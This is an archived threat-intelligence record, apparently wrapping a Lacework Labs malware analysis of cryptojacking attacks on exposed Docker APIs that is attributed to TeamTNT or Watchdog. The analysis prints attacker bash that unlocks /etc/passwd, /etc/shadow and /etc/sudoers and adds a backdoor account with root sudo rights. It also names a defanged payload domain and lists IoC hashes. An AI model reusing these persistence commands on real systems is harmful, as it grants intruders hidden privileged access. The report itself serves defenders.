{
    "id": "8a3dc58d-cdd2-4362-a304-21c63c52f787",
    "created_at": "2023-01-12T15:07:07.691733Z",
    "updated_at": "2025-03-27T02:16:59.304014Z",
    "deleted_at": null,
    "sha1_hash": "5cac0ffaff6e3ddce573fd61773371acb474369f",
    "title": "2021-10-25 - TeamTNT Continues to Target Exposed Docker API",
    "authors": "",
    "file_creation_date": "2022-05-28T05:01:41Z",
    "file_modification_date": "2022-05-28T05:01:41Z",
    "file_size": 781076,
    "plain_text": "# TeamTNT Continues to Target Exposed Docker API\n\n**lacework.com/blog/teamtnt-continues-to-target-exposed-docker-api/**\n\nOctober 25, 2021\n\n**[Update (2021-11-01) – Attribution for this activity has been disputed and recent analysis by Palo Alto indicates that Watchdog deliberately](https://unit42.paloaltonetworks.com/teamtnt-cryptojacking-watchdog-operations/)**\n_used TeamTNT tactics to mask their operations. Additionally the use of exploit-laden Golang malware reported in this blog is consistent with_\n_Watchdog activity._\n\n### Key Takeaways\n\nExposed Docker APIs continue to be targeted by TeamTNT\nDocker Hub continues to be leveraged for hosting malicious images.\nTeamTNT’s arsenal expands into Golang brute force utilities.\n\n## Caught In The Honeypot – Again!\n\nLacework Labs recently caught a new TeamTNT Docker image posing as an Apache server targeting exposed Docker APIs in the wild. Upon\nsuccessful deployment, the Docker image titled “apache” from Docker hub account “docker72590” creates a crontab entry that regularly\nexecutes and downloads additional payloads from hXXP://crypto[.]htxrecieve[.]top.\n\nFigure 1 – Cronjob Dropper\n\nAt the time of this blog post, the Docker image has 1,900 pulls and has been active under this account since August of 2021.\n\nFigure 2 – Dockerhub Account\n\n\n-----\n\n## Naming Schema TTP\n\nCross-referencing the domain in the cron entry shows low hits on VirusTotal along with three subdomains of “oracle,” “crypto,” and “pubzone”.\nThis creates overlapping naming schemas of domains and subdomains for a historical link of domains associated with TeamTNT activity, such\nas “zzhreceive[.]top”.\n\nFigure 3 – VT Hits\n\nReferencing the older domain “zzhrecieve[.]top”, the URL schema also matches the structure observed in historical open directory staging\nservers. Figures 4 and 5 below show the similar structure of the “.top” TLD, a sequence of alphanumeric characters followed by an open\ndirectory. Lacework Labs suspects that this combination is likely used to avoid web crawlers from indexing the files across common directory\nstructures.\n\nFigure 4 – Domain Similarities\n\nFigure 5 – Opendir Malware Hosting\n\n## New Tooling, Same Tricks\n\nMost of the TeamTNT tooling identified in this open directory has been previously reported by industry (XMRig, massscan, pdns scanner).\n[However, a x86 and x64 UPX packed Golang binary called “htx-i-(x86|i686)” containing brute force functionality was identified that Lacework](https://www.virustotal.com/gui/file/f64d39fe9d3e99e1b1ff21953c042e168ba888adf128f67c35023281eefc4949/detection)\nLabs has not previously seen Additionally bash scripts included a new ssh key (T1098 004) and a new account (T1136 001) under the name\n\n\n-----\n\no _sb be g added to t e u de y g_ ct ac e\n\nRSAKEY=”ssh-rsa\nAAAAB3NzaC1yc2EAAAADAQABAAABgQDSBnZe/PWHvY8XtKUTqQ3UTIM37U4BHIVVvwADdQf1WYQxAUwrtmL+b+uLpJIJgb/CsTgn7DxJRT\n\n[[email protected]”](https://www.lacework.com/cdn-cgi/l/email-protection)\n${CHATTR} -ia /etc/passwd;\ngrep -q lsb /etc/passwd || echo ‘lsb:x:1000:1000::/home/lsb:/bin/bash’ >> /etc/passwd\n${CHATTR} +ia /etc/passwd\n${CHATTR} -ia /etc/shadow\ngrep -q lsb /etc/shadow || echo ‘lsb:$y$j9T$4mqDHpJ8b4riHWm2FfUHY.$./.VlnKhJMI/hj8f8sxbqhIal0jKhPxjyHxB6ZGtUm6:18849:0:99999:7:::’ >>\n${CHATTR} +ia /etc/shadow\n${CHATTR} -ia /etc/sudoers\ngrep -q lsb /etc/sudoers || echo ‘lsb ALL=(ALL:ALL) ALL’ >> /etc/sudoers\n${CHATTR} +i /etc/sudoers\n\nFigure 6 – Bash Droppers w/ New Accounts & Keys\n\n[The Golang binary includes Open Source bindings for Postgresql,](https://github.com/lib/pq) [Redis,](https://github.com/go-redis/redis) [OpenTelemetry as well as custom packages to perform brute force](https://github.com/open-telemetry/opentelemetry-go)\nactions against ssh, Postgres and Redis services. The filepath of the adversary’s working environment can be seen in addition to other\npackage artifacts in Figure-6 below.\n\nFigure 7 – Golang Brute Force Paths\n\nEmbedded within the binary are several hardcoded usernames/passwords to support the brute force operations of this scan utility.\n\n\n-----\n\nFigure 8 – Golang Username/Password Combo\n\n## XMRig Configs\n\nAlso hosted in the open directories were three separate files titled “avg1.tar.gz”, “avg2.tar.gz” and “avg3.tar.gz”. These are in fact not tar files,\nbut JSON files that contain configuration information for the XMRig miner. All of the configuration files had the upstream URL pointing back to\nthe server with the open directory suggesting that a proxy miner may be in use. The use of a Cryptocurrency proxy miner allows a centralized\napproach for configuration management for multiple miners, such as controlling which wallet is donated to and what pools to contribute to.\n[XMRig, the popular open source Cryptocurrency miner also has a proxy.](https://github.com/xmrig/xmrig-proxy)\n\nFigure 9 – opendir 2\n\n\n-----\n\nFigure 10 – XMRig Configs\n\n## Conclusion\n\nAdversaries continue to prey on weak passwords and misconfigurations to obtain initial access in cloud environments. Ensuring your systems\nare hardened against weak credentials, out of date software and are not exposing unauthenticated API endpoints is critical to protect your\ncloud assets. For more content like this, follow Lacework and Lacework Labs on Twitter and LinkedIn!\n\n## IoCs\n\nArtifact (File/Domain/IP) Hash\n\n[htx-i.i686](https://www.virustotal.com/gui/search/name%253Ahtx-i.i686) f64d39fe9d3e99e1b1ff21953c042e168ba888adf128f67c35023281eefc4949\n\n[htx-i.686 (UPX packed)](https://www.virustotal.com/gui/file/1a1fb5458bddd77f52258b46428c551dd869cd213977ff4f01a76616a59c4bcd) 1a1fb5458bddd77f52258b46428c551dd869cd213977ff4f01a76616a59c4bcd\n\nai.sh 609ea576c7b430366f8118835f0ccb661b8875735dcc6bc55cb26d031a78d4af\n\nar.sh d584130e3e53f4152d3c5ddb3c5f6d31b923f48e92b628c199a583b8a04d556a\n\nd.sh b9fe879082970e08830aeacd27be8ae017ac56c19aec0161676d20681ec392d5\n\nb.sh bc1da58e62a5dbdaa5af28f406c1de39ffedce94d2e2a6e82a286e2d8e108254\n\nf.sh 97425b089e184f5373ff71de32015a8deba7b5652c7ed952b0030647b65310f4\n\nc.sh 95cd336e31f08a3c33d009faae52a71ca249f688b2355d75e3ade74e9d705435\n\na.sh fba130a236f69759f93fc964c364de7c731b1543f386f2c80ab6c347c15b4211\n\ncrontab.sh (from Docker image) 7e37c00d8c7a7f596d77c49ec8d69c168950c4cf65ed8d2184ba882a946f49fc\n\nai.sh a5d4f0a4109a6e78b8cd17f786e60ae8e9d9b9b53e6d4cd415d0689ca86dde5f\n\nar.sh c9d7c60d63d13eda57b616332c9803ad2db2bfb4f6dbf132fb46435735804814\n\nd.sh 4739e4deebfe79c41eacfc533aa2e8f165550c754b334a5ee0640fcac069ca2f\n\nb.sh bc1da58e62a5dbdaa5af28f406c1de39ffedce94d2e2a6e82a286e2d8e108254\n\nc.sh 95cd336e31f08a3c33d009faae52a71ca249f688b2355d75e3ade74e9d705435\n\na.sh 7127e91ebb342af4957740f9e089c1838e76d09f8ad305ef967adab9501cec74\n\navg3.tar.gz 539fcc468a29987b9d8d623e04c8b8659f3f22785044ec15cfe3ec46668a1f07\n\navg2.tar.gz 473f4e068e60c2a3bd9adff7e8b16411739999230814c2aea31e616c42e3815e\n\nhtx-i-.x86_64 (unpacked) 9a56365297461c773fff32a5ba3480486a685896323682cf3dd6391a6535150a\n\navg1.tar.gz 789daa4865a3ba964dc0300e82928c47676d031ccf16c83f866211de4a91fe4a\n\n\n-----\n\nXMRig 6.8.2 69510db42e300635a6e8a373f156cfa44d5cedad5e35f4ef0b2b2648503a3422\n\navg.tar.gz 293cd3f172dbac111945dd7de52c746a7b5cfbddca57247969397f4d356d1311\n\navg4.tar.gz 8c214f4db38266eda767bee6fd2a1c7d0435ff5b2f067b021adb654be522e751\n\nai.sh e77ab132b6b8ad236a8993d00c9ad6de3709ea2cebe7df0ec0eb4a1401642f02\n\nar.sh c35b6ccf7663c0d451b022a8714db78ffb0590aa07342868966f0509e9a1bd02\n\nd.sh eb371d81aa1b85d1fbdf94dfd34743c01fc68a2809e6925c6482e20f54455292\n\nb.sh 921ef70fcf433c08817286384afd4b7868e9b171eafed59ba3da362dc9128614\n\na.sh 355229282e78889fbce2b75499eae7a3f600225c807774d8fe68f9fc555fb240\n\nx.sh bd81696e8455bb6c3714960913b8eff654ea7f17daa9223aaa7b118a6a28a0ad\n\nCopyright 2021 Lacework Inc. All rights reserved.\n\n\n-----",
    "language": "EN",
    "sources": [
        {
            "id": "05d7b179-7656-44d8-a74c-9ab34d3df3a2",
            "created_at": "2023-01-12T14:38:44.599904Z",
            "updated_at": "2023-01-12T14:38:44.599904Z",
            "deleted_at": null,
            "name": "VXUG",
            "url": "https://www.vx-underground.org",
            "description": "vx-underground Papers",
            "reports": null
        }
    ],
    "references": [
        "https://papers.vx-underground.org/papers/Malware Defense/Malware Analysis 2021/2021-10-25 - TeamTNT Continues to Target Exposed Docker API.pdf"
    ],
    "report_names": [
        "2021-10-25 - TeamTNT Continues to Target Exposed Docker API.pdf"
    ],
    "threat_actors": [
        {
            "id": "eb3f4e4d-2573-494d-9739-1be5141cf7b2",
            "created_at": "2022-10-25T16:07:24.471018Z",
            "updated_at": "2025-03-27T02:02:10.24394Z",
            "deleted_at": null,
            "main_name": "Cron",
            "aliases": [],
            "source_name": "ETDA:Cron",
            "tools": [
                "Catelites",
                "Catelites Bot",
                "CronBot",
                "TinyZBot"
            ],
            "source_id": "ETDA",
            "reports": null
        },
        {
            "id": "f809bfcb-b200-4988-80a8-be78ef6a52ef",
            "created_at": "2023-01-06T13:46:39.186988Z",
            "updated_at": "2025-03-27T02:00:03.016358Z",
            "deleted_at": null,
            "main_name": "TeamTNT",
            "aliases": [
                "Adept Libra"
            ],
            "source_name": "MISPGALAXY:TeamTNT",
            "tools": [],
            "source_id": "MISPGALAXY",
            "reports": null
        },
        {
            "id": "c3ca592f-0669-49bd-ab5c-310007ab2fb4",
            "created_at": "2022-10-25T15:50:23.334495Z",
            "updated_at": "2025-03-27T02:00:55.445098Z",
            "deleted_at": null,
            "main_name": "TeamTNT",
            "aliases": [
                "TeamTNT"
            ],
            "source_name": "MITRE:TeamTNT",
            "tools": [
                "Peirates",
                "MimiPenguin",
                "LaZagne",
                "Hildegard"
            ],
            "source_id": "MITRE",
            "reports": null
        },
        {
            "id": "f9806b99-e392-46f1-9c13-885e376b239f",
            "created_at": "2023-01-06T13:46:39.431871Z",
            "updated_at": "2025-03-27T02:00:03.08926Z",
            "deleted_at": null,
            "main_name": "Watchdog",
            "aliases": [
                "Thief Libra"
            ],
            "source_name": "MISPGALAXY:Watchdog",
            "tools": [],
            "source_id": "MISPGALAXY",
            "reports": null
        }
    ],
    "ts_created_at": 1673536027,
    "ts_updated_at": 1743041819,
    "ts_creation_date": 1653714101,
    "ts_modification_date": 1653714101,
    "files": {
        "pdf": "https://archive.orkl.eu/5cac0ffaff6e3ddce573fd61773371acb474369f.pdf",
        "text": "https://archive.orkl.eu/5cac0ffaff6e3ddce573fd61773371acb474369f.txt",
        "img": "https://archive.orkl.eu/5cac0ffaff6e3ddce573fd61773371acb474369f.jpg"
    }
}